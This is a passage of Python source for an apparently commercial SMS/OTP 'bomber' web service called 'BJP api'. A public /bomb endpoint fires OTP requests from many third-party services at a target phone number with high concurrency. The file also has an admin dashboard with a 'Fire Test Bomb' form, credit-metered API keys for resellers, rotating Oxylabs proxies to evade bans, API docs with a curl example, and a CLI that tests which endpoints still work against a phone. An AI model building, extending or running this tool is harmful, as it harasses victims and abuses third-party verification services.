    return req.headers.get("x-api-key") or req.query_params.get("key")

PHONE_RE = re.compile(r"^[6-9]\d{9}$")

# ─── PUBLIC BOMB ───
@app.get("/bomb")
async def bomb_get(req: Request):
    key = get_key(req)
    auth = validate_key(key)
    if not auth["ok"]:
        return JSONResponse({"error": auth["reason"]}, status_code=401)
    num = str(req.query_params.get("num", "")).strip()
    if not PHONE_RE.match(num):
        return JSONResponse({"error": "invalid_phone"}, status_code=400)

    kd = auth["data"]
    all_eps = load_endpoints()
    if not all_eps:
        return JSONResponse({"error": "no_endpoints"}, status_code=400)

    cc = check_credits(kd["id"], 1)
    if not cc["ok"]:
        return JSONResponse({"error": cc["reason"], "credits": cc.get("remaining")}, status_code=402)

    max_ep = min(int(req.query_params.get("max", kd["max_endpoints"]) or kd["max_endpoints"]), kd["max_endpoints"])
    eps = all_eps[:max_ep]
    concurrency = min(int(req.query_params.get("concurrency", kd["max_concurrency"]) or kd["max_concurrency"]), kd["max_concurrency"])
    timeout_ms = max(500, min(int(req.query_params.get("timeout_ms", DEFAULT_TIMEOUT_MS) or DEFAULT_TIMEOUT_MS), 15000))

    sid = str(uuid.uuid4())
    create_session(sid, kd["id"], num)
    results = await fire_all(eps, num, concurrency, timeout_ms, PROXY_ENABLED)
    success = sum(1 for r in results if r["success"])
    if not kd["admin"] and success > 0:
        deduct_credits(kd["id"], success)
    log_results(kd["id"], num, sid, results)
    close_session(sid, len(results), success)
    return JSONResponse({"ok": True, "total_success": success})

# ─── ADMIN LOGIN ───
@app.get("/", include_in_schema=False)
async def root(): return RedirectResponse("/admin")

@app.get("/admin", response_class=HTMLResponse)
async def admin_login_page(req: Request):
    if is_admin(req): return RedirectResponse("/dashboard")
    body = """
<div style="max-width:420px;margin:70px auto;animation:slideUp .4s ease;">
  <div class="card">
    <h1 style="text-align:center;margin-bottom:4px;">BJP api</h1>
    <p class="muted" style="text-align:center;margin-bottom:22px;">Admin access</p>
    <form id="lf" style="margin-top:6px;">
      <div><label>Username</label><input id="u" autocomplete="username" required></div>
      <div><label>Password</label><input id="p" type="password" autocomplete="current-password" required></div>
      <button type="submit" style="margin-top:6px;width:100%;">Sign in</button>
      <p id="err" class="bad" style="min-height:18px;margin:6px 0 0;font-size:12px;"></p>
    </form>
  </div>
</div>
<script>
document.getElementById('lf').addEventListener('submit', async (e) => {
  e.preventDefault();
  const err = document.getElementById('err'); err.textContent = '';
  try {
    await api('/api/admin/login', {method:'POST', body:{user:document.getElementById('u').value, pass:document.getElementById('p').value}});
    location.href = '/dashboard';
  } catch (ex) { err.textContent = (ex.data && ex.data.error==='invalid_credentials') ? 'Invalid credentials' : (ex.message || 'login failed'); }
});
</script>"""
    return HTMLResponse(layout("Login", body, ""))

@app.post("/api/admin/login")
async def admin_login(req: Request):
    data = await req.json()
    if data.get("user") != ADMIN_USER or data.get("pass") != ADMIN_PASS:
        audit(data.get("user", "unknown"), "login_fail", ip=req.client.host)
        return JSONResponse({"error": "invalid_credentials"}, status_code=401)
    req.session["admin"] = True
    req.session["user"] = data.get("user")
    audit(data.get("user"), "login_ok", ip=req.client.host)
    return {"ok": True, "user": data.get("user")}

@app.post("/api/admin/logout")
async def admin_logout(req: Request):
    req.session.clear()
    return {"ok": True}

# ─── DASHBOARD ───
@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(req: Request):
    if not is_admin(req): return RedirectResponse("/admin")
    body = """
<div class="hero">
  <h0>BJP</h0>
  <div class="sub">Bomber Janta Party</div>
  <div class="underline"></div>
</div>

<div class="grid cols-4">
  <div class="stat"><div class="k">Total Fired</div><div class="v" id="s_fired">–</div></div>
  <div class="stat"><div class="k">Total Hits</div><div class="v good" id="s_hits">–</div></div>
  <div class="stat"><div class="k">Avg Response</div><div class="v" id="s_avg">–</div></div>
  <div class="stat"><div class="k">Success Rate</div><div class="v good" id="s_rate">–</div></div>
</div>
<div class="grid cols-3" style="margin-top:14px;">
  <div class="stat"><div class="k">Active Keys</div><div class="v" id="s_keys">–</div></div>
  <div class="stat"><div class="k">Sessions</div><div class="v" id="s_sessions">–</div></div>
  <div class="stat"><div class="k">Credits Outstanding</div><div class="v warn" id="s_credits">–</div></div>
</div>

<h2>Fire Test Bomb</h2>
<div class="card">
  <form id="bf">
    <div class="grid cols-2">
      <div><label>Phone (10 digits)</label><input id="b_phone" placeholder="9876543210" pattern="[6-9][0-9]{9}" required></div>
      <div><label>Max Endpoints</label><input id="b_max" type="number" value="50" min="1" max="500"></div>
    </div>
    <div class="grid cols-3">
      <div><label>Concurrency</label><input id="b_conc" type="number" value="25" min="1" max="100"></div>
      <div><label>Timeout (ms)</label><input id="b_timeout" type="number" value="3000" min="500" max="15000"></div>
      <div style="display:flex;align-items:flex-end;"><button type="submit" id="bb" style="width:100%;">Fire</button></div>
    </div>
  </form>
  <div id="bombOut" class="hidden" style="margin-top:16px;">
    <div class="stat" style="text-align:center;background:var(--green-soft);border-color:var(--green-soft);">
      <div class="k" style="color:#15803d;">Total Success</div>
      <div class="v good" id="b_total" style="font-size:38px;">0</div>
    </div>
  </div>
</div>

<h2>Recent Sessions</h2>
<div class="card tight">
  <table id="st"><thead><tr><th>ID</th><th>Phone</th><th>Fired</th><th>Hits</th><th>Status</th><th>Started</th></tr></thead>
  <tbody><tr><td colspan="6" class="muted">loading…</td></tr></tbody></table>
</div>

<h2>Live Request Log <span class="pill good" id="sseStat" style="font-size:10px;">connecting…</span></h2>
<div class="card tight">
  <div class="flex-between" style="margin-bottom:8px;">
    <span class="muted" id="liveCnt">0 events</span>
    <button class="ghost small" id="clearLive">Clear</button>
  </div>
  <table id="lt"><thead><tr><th>At</th><th>Phone</th><th>Endpoint</th><th>Type</th><th>Status</th><th>OK</th><th>ms</th></tr></thead>
  <tbody><tr><td colspan="7" class="muted">waiting for events…</td></tr></tbody></table>
</div>

<script>
let liveN = 0;
async function stats() {
  try {
    const s = await api('/api/admin/stats');
    const rate = s.total_fired ? ((s.total_hits/s.total_fired)*100).toFixed(2)+'%' : '0%';
    document.getElementById('s_fired').textContent = s.total_fired.toLocaleString();
    document.getElementById('s_hits').textContent = s.total_hits.toLocaleString();
    document.getElementById('s_avg').textContent = s.avg_ms + ' ms';
    document.getElementById('s_rate').textContent = rate;
    document.getElementById('s_keys').textContent = s.active_keys;
    document.getElementById('s_sessions').textContent = s.total_sessions;
    document.getElementById('s_credits').textContent = (s.total_credits_outstanding||0).toLocaleString();
  } catch (e) { if (e.status === 401) location.href = '/admin'; }
}
async function sessions() {
  try {
    const { sessions } = await api('/api/admin/sessions?limit=10');
    const tb = document.querySelector('#st tbody');
    if (!sessions.length) { tb.innerHTML = '<tr><td colspan="6" class="muted">no sessions yet</td></tr>'; return; }
    tb.innerHTML = sessions.map(s => `<tr>
      <td class="mono">${s.id.slice(0,8)}…</td>
      <td class="mono">${s.phone}</td><td>${s.total_fired}</td>
      <td class="${s.total_success?'good':''}">${s.total_success}</td>
      <td><span class="pill ${s.status==='completed'?'good':'warn'}">${s.status}</span></td>
      <td class="muted">${new Date(s.started_at).toLocaleTimeString()}</td></tr>`).join('');
  } catch {}
}
function live() {
  const tb = document.querySelector('#lt tbody'), st = document.getElementById('sseStat'), cnt = document.getElementById('liveCnt');
  tb.innerHTML = '';
  const es = new EventSource('/api/admin/logs/stream');
  es.addEventListener('hello', () => { st.textContent='live'; st.className='pill good'; st.style.fontSize='10px'; });
  es.onmessage = (ev) => {
    try {
      const l = JSON.parse(ev.data);
      const r = document.createElement('tr');
      r.innerHTML = `<td class="muted">${new Date(l.created_at).toLocaleTimeString()}</td>
        <td class="mono">${l.phone}</td><td>${l.endpoint_name||''}</td>
        <td class="muted">${l.endpoint_type||''}</td><td>${l.status_code||'–'}</td>
        <td>${l.success?'<span class="pill good">OK</span>':'<span class="pill bad">FAIL</span>'}</td>
        <td>${l.elapsed_ms||0}</td>`;
      tb.insertBefore(r, tb.firstChild);
      while (tb.childNodes.length > 200) tb.removeChild(tb.lastChild);
      liveN++; cnt.textContent = liveN + ' events';
    } catch {}
  };
  es.onerror = () => { st.textContent='reconnecting…'; st.className='pill warn'; st.style.fontSize='10px'; };
  document.getElementById('clearLive').onclick = () => { tb.innerHTML=''; liveN=0; cnt.textContent='0 events'; };
}
document.getElementById('bf').addEventListener('submit', async (e) => {
  e.preventDefault();
  const btn = document.getElementById('bb'); btn.disabled = true; btn.textContent = 'firing…';
  try {
    const phone = document.getElementById('b_phone').value.trim();
    const max = parseInt(document.getElementById('b_max').value)||50;
    const conc = parseInt(document.getElementById('b_conc').value)||25;
    const to = parseInt(document.getElementById('b_timeout').value)||3000;
    const r = await api('/api/admin/test-fire', {method:'POST', body:{phone, max, concurrency:conc, timeout_ms:to}});
    document.getElementById('bombOut').classList.remove('hidden');
    document.getElementById('b_total').textContent = r.total_success;
    toast('Bomb fired', 'good');
    stats(); sessions();
  } catch (ex) { toast(ex.message, 'bad'); }
  finally { btn.disabled = false; btn.textContent = 'Fire'; }
});
stats(); sessions(); live();
setInterval(stats, 5000); setInterval(sessions, 15000);
</script>"""
    return HTMLResponse(layout("Dashboard", body, "dashboard"))

# ─── ADMIN TEST FIRE ───
@app.post("/api/admin/test-fire")
async def admin_test_fire(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=403)
    body = await req.json()
    phone = str(body.get("phone","")).strip()
    if not PHONE_RE.match(phone):
        return JSONResponse({"error":"invalid_phone"}, status_code=400)
    eps = load_endpoints()
    max_ep = min(int(body.get("max",50)), 500)
    eps = eps[:max_ep]
    conc = min(int(body.get("concurrency",25)), 100)
    to = max(500, min(int(body.get("timeout_ms",3000)), 15000))
    sid = str(uuid.uuid4())
    create_session(sid, 0, phone)
    results = await fire_all(eps, phone, conc, to, PROXY_ENABLED)
    success = sum(1 for r in results if r["success"])
    log_results(0, phone, sid, results)
    close_session(sid, len(results), success)
    return {"ok": True, "total_success": success}

# ─── ADMIN STATS / SESSIONS / LOGS ───
@app.get("/api/admin/stats")
async def admin_stats(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    return get_global_stats()

@app.get("/api/admin/sessions")
async def admin_sessions(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    limit = min(int(req.query_params.get("limit", 50)), 500)
    return {"sessions": get_recent_sessions(limit)}

@app.get("/api/admin/logs")
async def admin_logs(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    limit = min(int(req.query_params.get("limit", 200)), 1000)
    key_id = int(req.query_params["key_id"]) if req.query_params.get("key_id") else None
    phone = req.query_params.get("phone")
    logs = get_recent_logs(limit=limit, key_id=key_id, phone=phone)
    return {"count": len(logs), "logs": logs}

@app.get("/api/admin/logs/stream")
async def admin_logs_stream(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    async def gen():
        last = get_max_log_id()
        yield f"event: hello\ndata: {json.dumps({'last_id': last})}\n\n"
        while True:
            try:
                rows = get_recent_logs(limit=100, since_id=last)
                if rows:
                    for r in reversed(rows):
                        yield f"data: {json.dumps(r)}\n\n"
                        if r["id"] > last: last = r["id"]
                else:
                    yield ": ping\n\n"
            except Exception as e:
                yield f"event: error\ndata: {json.dumps({'error':str(e)})}\n\n"
            await asyncio.sleep(1.5)
    return StreamingResponse(gen(), media_type="text/event-stream")

@app.post("/api/admin/logs/cleanup")
async def logs_cleanup(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    body = await req.json()
    days = int(body.get("days", 30))
    cutoff = int((time.time() - days * 86400) * 1000)
    with db() as c:
        cur = c.execute("DELETE FROM request_log WHERE created_at < ?", (cutoff,))
        n = cur.rowcount
    audit(req.session.get("user","admin"), "logs_cleanup", f"days={days} removed={n}")
    return {"ok": True, "removed": n}

# ─── KEYS ───
@app.get("/keys", response_class=HTMLResponse)
async def keys_page(req: Request):
    if not is_admin(req): return RedirectResponse("/admin")
    body = """
<h1>API Keys</h1>
<p class="muted">Every successful hit costs 1 credit.</p>

<div class="card">
  <h2 style="margin-top:0;">Generate New Key</h2>
  <form id="cf">
    <div class="grid cols-3">
      <div><label>Label</label><input id="k_label" placeholder="reseller-1"></div>
      <div><label>Plan</label><select id="k_plan">
        <option value="free">free · 0 credits</option>
        <option value="pro">pro · 500 credits</option>
        <option value="elite">elite · 5000 credits</option>
        <option value="admin">admin · unlimited</option>
      </select></div>
      <div><label>Days</label><input id="k_days" type="number" value="30" min="1" max="3650"></div>
    </div>
    <div class="grid cols-2">
      <div><label>Credits override</label><input id="k_credits" type="number" placeholder="plan default" min="0"></div>
      <div style="display:flex;align-items:flex-end;"><button type="submit" style="width:100%;">Generate</button></div>
    </div>
  </form>
  <pre id="newKey" class="hidden" style="margin-top:14px;"></pre>
</div>

<div class="card tight">
  <div class="flex-between" style="margin-bottom:10px;">
    <h2 style="margin:0;">Keys</h2>
    <div class="row">
      <input id="filt" placeholder="search…" style="width:220px;">
      <button class="ghost small" id="rl">Reload</button>
    </div>
  </div>
  <table id="kt"><thead><tr>
    <th>ID</th><th>Key</th><th>Label</th><th>Plan</th><th>Credits</th><th>Used</th>
    <th>Status</th><th>Created</th><th>Expires</th><th></th>
  </tr></thead><tbody><tr><td colspan="10" class="muted">loading…</td></tr></tbody></table>
</div>

<script>
let cache = [];
async function load() {
  try { const { keys } = await api('/api/admin/keys?limit=500'); cache = keys; render(); }
  catch (e) { if (e.status === 401) location.href = '/admin'; }
}
function render() {
  const q = document.getElementById('filt').value.trim().toLowerCase();
  const list = q ? cache.filter(k => (k.label||'').toLowerCase().includes(q) || k.key.toLowerCase().includes(q)) : cache;
  const tb = document.querySelector('#kt tbody');
  if (!list.length) { tb.innerHTML = '<tr><td colspan="10" class="muted">no keys</td></tr>'; return; }
  tb.innerHTML = list.map(k => `<tr>
    <td class="mono">${k.id}</td>
    <td class="mono" style="max-width:230px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${k.key}">${k.key}</td>
    <td>${k.label || '<span class="muted">—</span>'}</td>
    <td><span class="pill ${k.admin?'warn':'gray'}">${k.plan}</span></td>
    <td><input type="number" value="${k.credits}" min="0" style="width:96px;padding:5px 8px;" onchange="setCr(${k.id}, this.value)"></td>
    <td class="muted">${k.credits_used}</td>
    <td>${k.revoked?'<span class="pill bad">revoked</span>':'<span class="pill good">active</span>'}</td>
    <td class="muted">${new Date(k.created_at).toLocaleDateString()}</td>
    <td class="muted">${k.expires_at ? new Date(k.expires_at).toLocaleDateString() : 'never'}</td>
    <td><div class="row" style="gap:4px;">
      <button class="ghost small" onclick="addCr(${k.id})">+cr</button>
      <button class="ghost small" onclick="copyK('${k.key}')">copy</button>
      <button class="ghost small" onclick="resetK(${k.id})">reset</button>
      ${k.revoked?`<button class="good small" onclick="unrev(${k.id})">unrevoke</button>`:`<button class="danger small" onclick="rev(${k.id})">revoke</button>`}
      <button class="danger small" onclick="del(${k.id})">×</button>
    </div></td></tr>`).join('');
}
document.getElementById('cf').addEventListener('submit', async (e) => {
  e.preventDefault();
  const payload = { label: document.getElementById('k_label').value, plan: document.getElementById('k_plan').value,
                    days: parseInt(document.getElementById('k_days').value)||30 };
  const cr = document.getElementById('k_credits').value;
  if (cr) payload.credits = parseInt(cr);
  try {
    const r = await api('/api/admin/keys', {method:'POST', body:payload});
    const out = document.getElementById('newKey'); out.classList.remove('hidden');
    out.textContent = 'Created key:\\n' + r.key + '\\nplan=' + r.plan + ' credits=' + r.credits;
    toast('Key generated', 'good'); load();
  } catch (ex) { toast(ex.message, 'bad'); }
});
document.getElementById('rl').addEventListener('click', load);
document.getElementById('filt').addEventListener('input', render);
window.copyK = async (k) => { try { await navigator.clipboard.writeText(k); toast('Copied','good'); } catch { toast('Copy failed','bad'); } };
window.rev = async (id) => { if (!confirm('Revoke #'+id+'?')) return; try { await api('/api/admin/keys/'+id+'/revoke',{method:'POST'}); toast('Revoked','good'); load(); } catch (e){toast(e.message,'bad');} };
window.unrev = async (id) => { try { await api('/api/admin/keys/'+id+'/unrevoke',{method:'POST'}); toast('Unrevoked','good'); load(); } catch (e){toast(e.message,'bad');} };
window.del = async (id) => { if (!confirm('Delete #'+id+'?')) return; try { await api('/api/admin/keys/'+id,{method:'DELETE'}); toast('Deleted','good'); load(); } catch (e){toast(e.message,'bad');} };
window.resetK = async (id) => { try { await api('/api/admin/keys/'+id+'/reset',{method:'POST'}); toast('Reset','good'); load(); } catch (e){toast(e.message,'bad');} };
window.addCr = async (id) => { const v = prompt('Add credits:'); if (!v) return; try { await api('/api/admin/keys/'+id+'/credits/add',{method:'POST', body:{amount:parseInt(v)}}); toast('Done','good'); load(); } catch (e){toast(e.message,'bad');} };
window.setCr = async (id, v) => { try { await api('/api/admin/keys/'+id+'/credits/set',{method:'POST', body:{amount:parseInt(v)}}); toast('Set','good'); } catch (e){toast(e.message,'bad');} };
load(); setInterval(load, 20000);
</script>"""
    return HTMLResponse(layout("Keys", body, "keys"))

@app.get("/api/admin/keys")
async def admin_list_keys(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    limit = min(int(req.query_params.get("limit", 500)), 1000)
    return {"keys": list_keys(limit)}

@app.post("/api/admin/keys")
async def admin_create_key(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    b = await req.json()
    plan = b.get("plan","free")
    admin = plan == "admin"
    created = create_key(b.get("label",""), plan, int(b.get("days",30)), admin, b.get("credits"))
    audit(req.session.get("user","admin"), "key_create", f"id={created['id']} plan={plan}")
    return created

@app.post("/api/admin/keys/{kid}/revoke")
async def admin_revoke(kid: int, req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    with db() as c: c.execute("UPDATE api_keys SET revoked=1 WHERE id=?", (kid,))
    return {"ok": True}

@app.post("/api/admin/keys/{kid}/unrevoke")
async def admin_unrevoke(kid: int, req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    with db() as c: c.execute("UPDATE api_keys SET revoked=0 WHERE id=?", (kid,))
    return {"ok": True}

@app.delete("/api/admin/keys/{kid}")
async def admin_delete(kid: int, req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    with db() as c: c.execute("DELETE FROM api_keys WHERE id=?", (kid,))
    return {"ok": True}

@app.post("/api/admin/keys/{kid}/reset")
async def admin_reset(kid: int, req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    with db() as c: c.execute("UPDATE api_keys SET used_today=0, last_reset=? WHERE id=?", (int(time.time()*1000), kid))
    return {"ok": True}

@app.post("/api/admin/keys/{kid}/credits/add")
async def admin_credits_add(kid: int, req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    b = await req.json(); amt = int(b.get("amount", 0))
    return {"ok": True, "credits": add_credits(kid, amt)}

@app.post("/api/admin/keys/{kid}/credits/set")
async def admin_credits_set(kid: int, req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    b = await req.json(); amt = int(b.get("amount", 0))
    set_credits(kid, amt)
    return {"ok": True, "credits": amt}

# ─── LOGS PAGE ───
@app.get("/logs", response_class=HTMLResponse)
async def logs_page(req: Request):
    if not is_admin(req): return RedirectResponse("/admin")
    body = """
<h1>Logs</h1>
<p class="muted">Every request dispatched.</p>
<div class="card">
  <form id="ff">
    <div class="grid cols-3">
      <div><label>Phone</label><input id="f_phone" placeholder="9876543210"></div>
      <div><label>Limit</label><input id="f_limit" type="number" value="200" min="10" max="1000"></div>
      <div style="display:flex;align-items:flex-end;gap:8px;">
        <button type="submit">Filter</button>
        <button type="button" class="ghost" id="clr">Clear</button>
      </div>
    </div>
  </form>
  <div class="row" style="margin-top:12px;">
    <button class="ghost small" id="clean">Cleanup old (30d)</button>
    <span class="muted" id="cnt"></span>
  </div>
</div>
<div class="card tight">
  <table id="lt"><thead><tr><th>At</th><th>Phone</th><th>Endpoint</th><th>Type</th><th>Status</th><th>OK</th><th>ms</th><th>Proxy</th><th>Error</th></tr></thead>
  <tbody><tr><td colspan="9" class="muted">loading…</td></tr></tbody></table>
</div>
<script>
async function load() {
  const p = new URLSearchParams();
  const ph = document.getElementById('f_phone').value.trim();
  const li = document.getElementById('f_limit').value.trim();
  if (ph) p.set('phone', ph);
  if (li) p.set('limit', li);
  try {
    const { logs, count } = await api('/api/admin/logs?' + p.toString());
    document.getElementById('cnt').textContent = count + ' entries';
    const tb = document.querySelector('#lt tbody');
    if (!logs.length) { tb.innerHTML = '<tr><td colspan="9" class="muted">no logs</td></tr>'; return; }
    tb.innerHTML = logs.map(l => `<tr>
      <td class="muted">${new Date(l.created_at).toLocaleString()}</td>
      <td class="mono">${l.phone}</td><td>${l.endpoint_name||''}</td>
      <td class="muted">${l.endpoint_type||''}</td><td>${l.status_code||'–'}</td>
      <td>${l.success?'<span class="pill good">OK</span>':'<span class="pill bad">FAIL</span>'}</td>
      <td>${l.elapsed_ms||0}</td>
      <td class="mono muted">${l.proxy_used?l.proxy_used.slice(0,24)+'…':'direct'}</td>
      <td class="muted">${l.error||''}</td></tr>`).join('');
  } catch (e) { if (e.status === 401) location.href = '/admin'; }
}
document.getElementById('ff').addEventListener('submit', (e)=>{e.preventDefault();load();});
document.getElementById('clr').onclick = () => { document.getElementById('f_phone').value=''; document.getElementById('f_limit').value='200'; load(); };
document.getElementById('clean').onclick = async () => {
  if (!confirm('Delete logs older than 30 days?')) return;
  try { const r = await api('/api/admin/logs/cleanup', {method:'POST', body:{days:30}}); toast('Removed '+r.removed, 'good'); load(); }
  catch (e) { toast(e.message, 'bad'); }
};
load(); setInterval(load, 15000);
</script>"""
    return HTMLResponse(layout("Logs", body, "logs"))

# ─── PROXIES PAGE ───
@app.get("/proxies", response_class=HTMLResponse)
async def proxies_page(req: Request):
    if not is_admin(req): return RedirectResponse("/admin")
    body = """
<h1>Proxies</h1>
<p class="muted">Oxylabs session rotation. Falls back direct when unset or failing.</p>
<div class="card">
  <div class="kv">
    <div class="k">Enabled</div><div id="px_en">–</div>
    <div class="k">Provider</div><div class="mono" id="px_pr">–</div>
    <div class="k">Host:Port</div><div class="mono" id="px_hp">–</div>
    <div class="k">Session prefix</div><div class="mono" id="px_sp">–</div>
    <div class="k">Session time</div><div id="px_st">–</div>
    <div class="k">Fallback direct</div><div id="px_fb">–</div>
  </div>
</div>
<div class="grid cols-3">
  <div class="stat"><div class="k">Total Hits</div><div class="v good" id="p_hits">–</div></div>
  <div class="stat"><div class="k">Total Fails</div><div class="v bad" id="p_fails">–</div></div>
  <div class="stat"><div class="k">Banned</div><div class="v warn" id="p_ban">–</div></div>
</div>
<div class="card tight" style="margin-top:14px;">
  <table id="pt"><thead><tr><th>Proxy</th><th>Hits</th><th>Fails</th><th>Rate</th><th>Last Status</th><th>Last Used</th><th>State</th></tr></thead>
  <tbody><tr><td colspan="7" class="muted">loading…</td></tr></tbody></table>
</div>
<script>
async function load() {
  try {
    const r = await api('/api/admin/proxies');
    document.getElementById('px_en').innerHTML = r.enabled ? '<span class="pill good">on</span>' : '<span class="pill gray">off</span>';
    document.getElementById('px_pr').textContent = r.provider || '–';
    document.getElementById('px_hp').textContent = r.host_port || '–';
    document.getElementById('px_sp').textContent = r.session_prefix || '(auto)';
    document.getElementById('px_st').textContent = (r.session_time||0) + 's';
    document.getElementById('px_fb').innerHTML = r.fallback_direct ? '<span class="pill good">yes</span>' : '<span class="pill gray">no</span>';
    const list = r.proxies || [];
    const hits = list.reduce((a,p)=>a+p.hits,0), fails = list.reduce((a,p)=>a+p.failures,0);
    const ban = list.filter(p=>p.banned).length;
    document.getElementById('p_hits').textContent = hits;
    document.getElementById('p_fails').textContent = fails;
    document.getElementById('p_ban').textContent = ban;
    const tb = document.querySelector('#pt tbody');
    if (!list.length) { tb.innerHTML = '<tr><td colspan="7" class="muted">no proxy traffic yet</td></tr>'; return; }
    tb.innerHTML = list.map(p => {
      const tot = p.hits + p.failures;
      const rate = tot ? ((p.hits/tot)*100).toFixed(1)+'%' : '–';
      return `<tr>
        <td class="mono" style="max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${p.proxy}">${p.proxy}</td>
        <td class="good">${p.hits}</td><td class="bad">${p.failures}</td><td>${rate}</td>
        <td>${p.last_status||'–'}</td>
        <td class="muted">${p.last_used?new Date(p.last_used).toLocaleTimeString():'–'}</td>
        <td>${p.banned?'<span class="pill bad">banned</span>':'<span class="pill good">ok</span>'}</td></tr>`;
    }).join('');
  } catch (e) { if (e.status === 401) location.href = '/admin'; }
}
load(); setInterval(load, 15000);
</script>"""
    return HTMLResponse(layout("Proxies", body, "proxies"))

@app.get("/api/admin/proxies")
async def admin_proxies(req: Request):
    if not is_admin(req): return JSONResponse({"error":"admin_only"}, status_code=401)
    with db() as c:
        rows = [dict(r) for r in c.execute("SELECT * FROM proxy_stats ORDER BY hits DESC").fetchall()]
    return {
        "enabled": PROXY_ENABLED,
        "provider": PROXY_PROVIDER if PROXY_ENABLED else None,
        "host_port": f"{OXY_HOST}:{OXY_PORT}" if PROXY_ENABLED else None,
        "session_prefix": OXY_SESSION_PREFIX if PROXY_ENABLED else None,
        "session_time": OXY_SESSION_TIME if PROXY_ENABLED else 0,
        "fallback_direct": PROXY_FALLBACK_DIRECT,
        "proxies": rows,
    }

# ─── DOCS ───
@app.get("/docs", response_class=HTMLResponse)
async def docs_page(req: Request):
    body = """
<h1>API Reference</h1>
<p class="muted">Public REST API.</p>

<h2>Authentication</h2>
<div class="card">
  <pre>X-API-Key: bjp_xxxxxxxxxxxxxxxxxxxxxxxx</pre>
  <p class="muted" style="margin-top:8px;">or</p>
  <pre>?key=bjp_xxxxxxxxxxxxxxxxxxxxxxxx</pre>
</div>

<h2>GET /bomb</h2>
<div class="card">
  <p>Dispatch OTP requests to a target phone.</p>
  <pre>GET /bomb?num=9876543210&amp;max=100&amp;concurrency=25&amp;timeout_ms=3000
X-API-Key: bjp_xxx</pre>
  <h3 style="margin:16px 0 8px;font-size:13px;">Response</h3>
  <pre>{
  "ok": true,
  "total_success": 74
}</pre>
</div>

<h2>Errors</h2>
<div class="card">
  <table><thead><tr><th>Status</th><th>Meaning</th></tr></thead><tbody>
    <tr><td>400</td><td>Invalid phone or params</td></tr>
    <tr><td>401</td><td>Missing/invalid/revoked/expired key</td></tr>
    <tr><td>402</td><td>Credits exhausted</td></tr>
    <tr><td>500</td><td>Internal error</td></tr>
  </tbody></table>
</div>

<h2>Example (curl)</h2>
<div class="card"><pre>curl "https://your-domain/bomb?num=9876543210&amp;max=50" \\
  -H "X-API-Key: bjp_xxx"</pre></div>

<h2>Credits</h2>
<div class="card">
  <p>Each successful hit costs 1 credit. Credits exhaust → HTTP 402.</p>
</div>"""
    return HTMLResponse(layout("API", body, "docs"))

# ─────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────

def cli_seed():
    init_db()
    rows = list_keys(500)
    admins = [k for k in rows if k["admin"]]
    if admins:
        print("[seed] admin already exists")
        for a in admins:
            print(f"  id={a['id']}  key={a['key']}")
        return
    k = create_key("root-admin", "admin", 3650, True)
    print("\n=== BJP api — admin key ===")
    print(f"Key : {k['key']}")
    print("SAVE THIS. Not recoverable.\n")

def cli_convert():
    eps = load_endpoints()
    print(f"[convert] loaded {len(eps)} endpoints from {MERGED_PATH}")

async def cli_prune(phone: str, write: bool):
    init_db()
    eps = load_endpoints()
    if not PHONE_RE.match(phone):
        print("usage: main.py prune <10-digit-phone> [--write]")
        return
    print(f"[prune] firing {len(eps)} endpoints against {phone}…")
    results = await fire_all(eps, phone, 25, 4000, PROXY_ENABLED)
    working = [eps[i] for i, r in enumerate(results) if r["success"]]
    print(f"[prune] working: {len(working)}/{len(eps)}")
    if write:
        Path(MERGED_PATH).with_suffix(".pruned.json").write_text(
            json.dumps(working, indent=2), encoding="utf-8")
        print(f"[prune] wrote {MERGED_PATH.rsplit('.',1)[0]}.pruned.json")

def cli_serve():
    import uvicorn
    uvicorn.run("main:app", host=HOST, port=PORT, reload=False, log_level="info")

if __name__ == "__main__":
    args = sys.argv[1:]
    cmd = args[0] if args else "serve"
    if cmd == "serve":       cli_serve()
    elif cmd == "seed":      cli_seed()
    elif cmd == "convert":   cli_convert()
    elif cmd == "prune":
        phone = args[1] if len(args) > 1 else ""
        asyncio.run(cli_prune(phone, "--write" in args))
    else:
        print(__doc__)